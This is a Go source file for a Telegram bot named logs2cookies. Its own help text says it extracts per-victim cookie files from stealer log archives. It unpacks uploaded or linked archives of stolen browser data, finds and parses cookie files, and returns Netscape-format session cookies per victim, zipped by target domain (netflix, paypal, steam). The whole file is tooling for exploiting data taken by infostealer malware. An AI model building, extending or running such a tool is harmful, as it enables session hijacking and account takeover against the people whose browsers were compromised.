package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"runtime/debug"
	"sort"
	"strings"
	"sync"
	"time"
)

const (
	MAX_ARCHIVE_BYTES_URL = 5 * 1024 * 1024 * 1024
	MAX_FILE_BYTES        = 50 * 1024 * 1024
	WORK_TTL              = 30 * time.Minute
)

var COOKIE_NAME_HINTS = []string{
	"cookie", "cookies", "netscape_cookies",
}

// browserNames are used to catch cookie files named after the browser
// (e.g. chrome.txt, firefox.json) that don't have "cookie" in the path.
var browserNames = []string{
	"chrome", "chromium", "firefox", "edge", "msedge", "opera",
	"brave", "yandex", "vivaldi", "safari", "gecko",
}

type CookieRow struct {
	Domain     string
	Flag       string
	Path       string
	Secure     string
	Expiration string
	Name       string
	Value      string
	Source     string
}

type Stats struct {
	ArchiveFiles  int
	CookieFiles   int
	TotalCookies  int
	UniqueCookies int
	DomainCounts  map[string]int
	BrowserHints  map[string]int
}

func workRoot() string {
	if r := strings.TrimSpace(os.Getenv("WORK_ROOT")); r != "" {
		return r
	}
	return "work"
}

func main() {
	// Soft-cap heap at 7 GiB so the GC reclaims aggressively before the
	// 8 GiB cgroup OOM-kills us. Cheap insurance.
	debug.SetMemoryLimit(7 << 30)

	if len(os.Args) > 1 && os.Args[1] == "download" {
		runCLIDownload(os.Args[2:])
		return
	}
	root := workRoot()
	if err := runTelegramBot(root); err != nil {
		log.Fatalf("bot: %v", err)
	}
}

func handle(bot *Bot, m IncomingMsg) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("panic: %v", r)
			reply(bot, m, fmt.Sprintf("internal error: %v", r))
		}
	}()

	if m.Command != "" {
		switch m.Command {
		case "start", "help":
			reply(bot, m, helpText())
		case "cancel":
			if s := getActiveSessionByChat(m.ChatID); s != nil {
				cleanupSession(s)
				reply(bot, m, "session cancelled, files cleaned up")
			} else {
				reply(bot, m, "no active session")
			}
		case "done":
			if s := getActiveSessionByChat(m.ChatID); s != nil && s.State == StateAwaitingParts {
				finishMultipartUpload(bot, m, s)
			} else {
				reply(bot, m, "no multi-part upload in progress — send archive parts first")
			}
		}
		return
	}

	if m.Document != nil {
		startSessionFromFile(bot, m)
		return
	}

	if s := getActiveSessionByChat(m.ChatID); s != nil && m.Text != "" {
		switch s.State {
		case StateAwaitingPassword:
			handlePasswordReply(bot, m, s)
			return
		case StateAwaitingSearch:
			handleSearchReply(bot, m, s)
			return
		case StateAwaitingCustom:
			handleCustomReply(bot, m, s)
			return
		}
	}

	if url := extractURL(m.Text); url != "" {
		startSessionFromURL(bot, m, url)
		return
	}
}

var urlRe = regexp.MustCompile(`https?://[^\s)]+`)

func extractURL(text string) string {
	if text == "" {
		return ""
	}
	return urlRe.FindString(text)
}

func runCLIDownload(args []string) {
	if len(args) == 0 {
		fmt.Println("usage: logs2cookies download <url> [parallel=20] [maxMB=0]")
		os.Exit(2)
	}
	url := args[0]
	parallel := DEFAULT_PARALLEL
	var maxBytes int64
	if len(args) > 1 {
		fmt.Sscanf(args[1], "%d", &parallel)
	}
	if len(args) > 2 {
		var mb int64
		fmt.Sscanf(args[2], "%d", &mb)
		maxBytes = mb * 1024 * 1024
	}
	dst := "download.bin"
	if u := strings.LastIndexAny(url, "/\\"); u != -1 {
		dst = url[u+1:]
		if i := strings.IndexByte(dst, '?'); i != -1 {
			dst = dst[:i]
		}
	}
	log.Printf("downloading %s -> %s (parallel=%d, maxMB=%d)", url, dst, parallel, maxBytes/(1024*1024))
	prog := func(d, total int64, bps float64) {
		pct := 0.0
		if total > 0 {
			pct = float64(d) / float64(total) * 100
		}
		log.Printf("  %s / %s  (%.1f%%)  @ %s/s", formatBytes(d), formatBytes(total), pct, formatBytes(int64(bps)))
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Minute)
	defer cancel()
	res, err := parallelDownload(ctx, url, dst, parallel, maxBytes, prog)
	if err != nil {
		log.Fatalf("download failed: %v", err)
	}
	mbps := float64(res.Bytes) / 1024 / 1024 / res.Duration.Seconds()
	log.Printf("DONE: %s in %s — %.2f MB/s — parallel=%d range=%v ctype=%s",
		formatBytes(res.Bytes), res.Duration.Round(time.Millisecond), mbps, res.Parallel, res.RangeUsed, res.ContentType)
}

func parseFilter(caption string) string {
	caption = strings.TrimSpace(caption)
	if caption == "" {
		return ""
	}
	low := strings.ToLower(caption)
	if strings.HasPrefix(low, "filter:") {
		return strings.TrimSpace(caption[len("filter:"):])
	}
	return caption
}

func filterTag(f string) string {
	if f == "" {
		return ""
	}
	return " (filter=" + f + ")"
}

func looksLikeCookieFile(fullPath string) bool {
	p := strings.ToLower(fullPath)
	p = strings.ReplaceAll(p, "\\", "/")

	base := p
	if i := strings.LastIndex(p, "/"); i >= 0 {
		base = p[i+1:]
	}

	// No extension: only match if the filename is exactly "cookies".
	if !strings.HasSuffix(p, ".txt") && !strings.HasSuffix(p, ".json") && !strings.HasSuffix(p, ".dat") {
		return base == "cookies"
	}

	// Path contains an explicit cookie-related keyword → always match.
	for _, h := range COOKIE_NAME_HINTS {
		if strings.Contains(p, h) {
			return true
		}
	}

	// .txt/.json/.dat file whose name (without extension) is a browser name
	// → likely a cookie dump named after the browser (chrome.txt, firefox.json…).
	stem := base
	for _, ext := range []string{".txt", ".json", ".dat"} {
		stem = strings.TrimSuffix(stem, ext)
	}
	for _, b := range browserNames {
		if stem == b {
			return true
		}
	}

	return false
}

func detectBrowser(path string) string {
	lp := strings.ToLower(path)
	candidates := []string{"chrome", "edge", "firefox", "opera", "brave", "yandex", "vivaldi", "chromium", "gecko"}
	for _, c := range candidates {
		if strings.Contains(lp, c) {
			return c
		}
	}
	return "unknown"
}

func parseCookieFile(name string, data []byte) []CookieRow {
	i := 0
	for i < len(data) && (data[i] == ' ' || data[i] == '\t' || data[i] == '\n' || data[i] == '\r') {
		i++
	}
	if i < len(data) && (data[i] == '[' || data[i] == '{') {
		if rows := parseJSONCookies(name, data); len(rows) > 0 {
			return rows
		}
	}
	return parseNetscape(name, data)
}

func parseNetscape(source string, data []byte) []CookieRow {
	var out []CookieRow
	scn := bufio.NewScanner(bytes.NewReader(data))
	scn.Buffer(make([]byte, 0, 64*1024), 4*1024*1024)
	for scn.Scan() {
		line := scn.Text()
		if line == "" {
			continue
		}
		if strings.HasPrefix(line, "#") && !strings.HasPrefix(line, "#HttpOnly_") {
			continue
		}
		raw := line
		if strings.HasPrefix(raw, "#HttpOnly_") {
			raw = strings.TrimPrefix(raw, "#HttpOnly_")
		}
		parts := strings.Split(raw, "\t")
		if len(parts) < 7 {
			continue
		}
		out = append(out, CookieRow{
			Domain:     parts[0],
			Flag:       parts[1],
			Path:       parts[2],
			Secure:     parts[3],
			Expiration: parts[4],
			Name:       parts[5],
			Value:      strings.Join(parts[6:], "\t"),
			Source:     source,
		})
	}
	return out
}

type jsonCookie struct {
	Domain         string      `json:"domain"`
	Path           string      `json:"path"`
	Name           string      `json:"name"`
	Value          string      `json:"value"`
	Secure         bool        `json:"secure"`
	HostOnly       bool        `json:"hostOnly"`
	HTTPOnly       bool        `json:"httpOnly"`
	ExpirationDate interface{} `json:"expirationDate"`
}

func parseJSONCookies(source string, data []byte) []CookieRow {
	var arr []jsonCookie
	if err := json.Unmarshal(data, &arr); err == nil {
		return jsonToRows(source, arr)
	}
	var obj struct {
		Cookies []jsonCookie `json:"cookies"`
	}
	if err := json.Unmarshal(data, &obj); err == nil && len(obj.Cookies) > 0 {
		return jsonToRows(source, obj.Cookies)
	}
	return nil
}

func jsonToRows(source string, arr []jsonCookie) []CookieRow {
	rows := make([]CookieRow, 0, len(arr))
	for _, c := range arr {
		dom := c.Domain
		if dom == "" {
			continue
		}
		flag := "TRUE"
		if c.HostOnly {
			flag = "FALSE"
		}
		secure := "FALSE"
		if c.Secure {
			secure = "TRUE"
		}
		exp := "0"
		switch v := c.ExpirationDate.(type) {
		case float64:
			exp = fmt.Sprintf("%d", int64(v))
		case int64:
			exp = fmt.Sprintf("%d", v)
		case string:
			exp = v
		}
		path := c.Path
		if path == "" {
			path = "/"
		}
		rows = append(rows, CookieRow{
			Domain:     dom,
			Flag:       flag,
			Path:       path,
			Secure:     secure,
			Expiration: exp,
			Name:       c.Name,
			Value:      c.Value,
			Source:     source,
		})
	}
	return rows
}

func dedupe(rows []CookieRow) []CookieRow {
	seen := make(map[string]struct{}, len(rows))
	out := rows[:0]
	for _, r := range rows {
		k := r.Domain + "\x00" + r.Path + "\x00" + r.Name + "\x00" + r.Value
		if _, ok := seen[k]; ok {
			continue
		}
		seen[k] = struct{}{}
		out = append(out, r)
	}
	return out
}

// cleanSourceName turns a stealer-log path like
//
//	"5511_ON_CHANNEL/[USA][Win10]hash1/Chrome_Default/Network/Cookies.txt"
//
// into a tidy zip-entry stem like
//
//	"5511_ON_CHANNEL_USAWin10hash1_Chrome_Default".
//
// Strategy: keep ALL non-generic path segments joined by "_", so siblings
// that share a wrapper folder stay distinct via their unique sub-paths.
// (The previous "first non-generic segment" rule collapsed every victim
// under a shared wrapper into the same filename → all cookies mixed.)
func cleanSourceName(src string) string {
	src = strings.ReplaceAll(src, "\\", "/")
	parts := strings.Split(src, "/")
	if len(parts) > 0 {
		last := parts[len(parts)-1]
		if hasCookieFileExt(last) {
			parts = parts[:len(parts)-1]
		}
	}

	generic := map[string]bool{
		"":     true,
		"logs": true, "log": true,
		"cookies": true, "cookie": true,
		"network": true, "default": true, "profile": true, "profiles": true,
		"data": true, "user data": true, "userdata": true,
		"browser": true, "browsers": true, "extension": true, "extensions": true,
		"local": true, "roaming": true, "appdata": true,
	}

	var keep []string
	for _, p := range parts {
		lp := strings.ToLower(strings.TrimSpace(p))
		if generic[lp] {
			continue
		}
		keep = append(keep, p)
	}

	var name string
	if len(keep) == 0 {
		name = "session"
	} else {
		name = strings.Join(keep, "_")
	}

	browser := detectBrowser(src)
	if browser != "unknown" && !strings.Contains(strings.ToLower(name), browser) {
		name = name + "_" + browser
	}

	out := safeFilename(name)
	if out == "" {
		out = "session"
	}
	return out
}

func hasCookieFileExt(name string) bool {
	n := strings.ToLower(name)
	return strings.HasSuffix(n, ".txt") || strings.HasSuffix(n, ".json") || strings.HasSuffix(n, ".dat")
}

// safeFilename strips bad chars and caps length, preferring to keep the
// SUFFIX of long names — the rightmost segments are the most specific
// (browser/profile/victim hash) and most informative.
func safeFilename(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9',
			r == '-', r == '_', r == '.':
			b.WriteRune(r)
		case r == ' ' || r == '/':
			b.WriteRune('_')
		}
	}
	out := strings.Trim(b.String(), "._-")
	if len(out) > 80 {
		out = out[len(out)-80:]
		out = strings.Trim(out, "._-")
	}
	return out
}

func writeNetscape(path string, rows []CookieRow) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	w := bufio.NewWriter(f)
	fmt.Fprintln(w, "# Netscape HTTP Cookie File")
	fmt.Fprintln(w, "# Generated by logs2cookies-bot")
	fmt.Fprintln(w, "# https://curl.se/docs/http-cookies.html")
	fmt.Fprintln(w, "")
	for _, r := range rows {
		fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
			r.Domain, defaultStr(r.Flag, "TRUE"), defaultStr(r.Path, "/"),
			defaultStr(r.Secure, "FALSE"), defaultStr(r.Expiration, "0"),
			r.Name, r.Value,
		)
	}
	return w.Flush()
}

func writeJSON(path string, rows []CookieRow) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	return enc.Encode(rows)
}

func defaultStr(v, def string) string {
	if v == "" {
		return def
	}
	return v
}

func normalDomain(d string) string {
	d = strings.TrimPrefix(d, ".")
	return strings.ToLower(d)
}

func summary(s Stats, filter, archive string) string {
	type kv struct {
		k string
		v int
	}
	doms := make([]kv, 0, len(s.DomainCounts))
	for k, v := range s.DomainCounts {
		doms = append(doms, kv{k, v})
	}
	sort.Slice(doms, func(i, j int) bool { return doms[i].v > doms[j].v })
	if len(doms) > 10 {
		doms = doms[:10]
	}
	var b strings.Builder
	fmt.Fprintf(&b, "archive: %s\n", archive)
	fmt.Fprintf(&b, "files scanned: %d | cookie files: %d\n", s.ArchiveFiles, s.CookieFiles)
	fmt.Fprintf(&b, "cookies: %d total, %d unique%s\n", s.TotalCookies, s.UniqueCookies, filterTag(filter))
	if len(s.BrowserHints) > 0 {
		fmt.Fprintf(&b, "sources: ")
		first := true
		for k, v := range s.BrowserHints {
			if !first {
				b.WriteString(", ")
			}
			fmt.Fprintf(&b, "%s=%d", k, v)
			first = false
		}
		b.WriteString("\n")
	}
	if len(doms) > 0 {
		b.WriteString("top domains:\n")
		for _, d := range doms {
			fmt.Fprintf(&b, "  %s — %d\n", d.k, d.v)
		}
	}
	return b.String()
}

func helpText() string {
	return strings.Join([]string{
		"🍪 *logs2cookies*",
		"extracts per-victim cookie files from stealer log archives.",
		"",
		"*step 1 — send the archive*",
		"  📎 attach a .zip or .rar (up to `2 GB` via MTProto)",
		"  📎 multi-part rar? send all parts (.rar + .r00/.r01 or .part1.rar …) then `/done`",
		"  🔗 or paste a direct URL / simple redirect to a .zip or .rar (up to `5 GB`)",
		"  🪆 nested archives unpacked automatically (up to 4 levels)",
		"  🔒 encrypted? the bot will ask for the password",
		"",
		"*step 2 — pick what to extract*",
		"  • type domains: `netflix paypal steam`",
		"  • tap *extract all* or *top 50* for quick grabs",
		"  • tap *browse domains* to toggle domains one by one",
		"",
		"*tip — pre-filter (optional)*",
		"  add `filter:netflix` as the file caption to skip unrelated cookies during extraction",
		"",
		"*output*",
		"  one Netscape .txt per victim, inside a .zip per domain",
		"",
		"  /cancel — abort current session",
	}, "\n")
}

func reply(bot *Bot, m IncomingMsg, text string) {
	if _, err := bot.SendTextTo(m.ChatID, m.Peer, text); err != nil {
		log.Printf("reply chat=%d failed: %v", m.ChatID, err)
	}
}

func editStatus(bot *Bot, m SentMsg, text string) {
	if m.MsgID == 0 {
		return
	}
	bot.EditStatus(m, text)
}

type progressFn func(done, total int64, bps float64)

type progressReader struct {
	r        io.Reader
	total    int64
	done     int64
	cb       progressFn
	start    time.Time
	lastEdit time.Time
}

func (p *progressReader) Read(b []byte) (int, error) {
	n, err := p.r.Read(b)
	if n > 0 {
		p.done += int64(n)
		if p.cb != nil && time.Since(p.lastEdit) >= 2*time.Second {
			elapsed := time.Since(p.start).Seconds()
			bps := 0.0
			if elapsed > 0 {
				bps = float64(p.done) / elapsed
			}
			p.cb(p.done, p.total, bps)
			p.lastEdit = time.Now()
		}
	}
	return n, err
}

func (p *progressReader) flush() {
	if p.cb != nil {
		elapsed := time.Since(p.start).Seconds()
		bps := 0.0
		if elapsed > 0 {
			bps = float64(p.done) / elapsed
		}
		p.cb(p.done, p.total, bps)
	}
}

var janMu sync.Mutex

func janitor(root string) {
	t := time.NewTicker(5 * time.Minute)
	defer t.Stop()
	for range t.C {
		janMu.Lock()
		entries, _ := os.ReadDir(root)
		for _, e := range entries {
			info, err := e.Info()
			if err != nil {
				continue
			}
			if time.Since(info.ModTime()) > WORK_TTL {
				os.RemoveAll(filepath.Join(root, e.Name()))
			}
		}
		janMu.Unlock()
	}
}
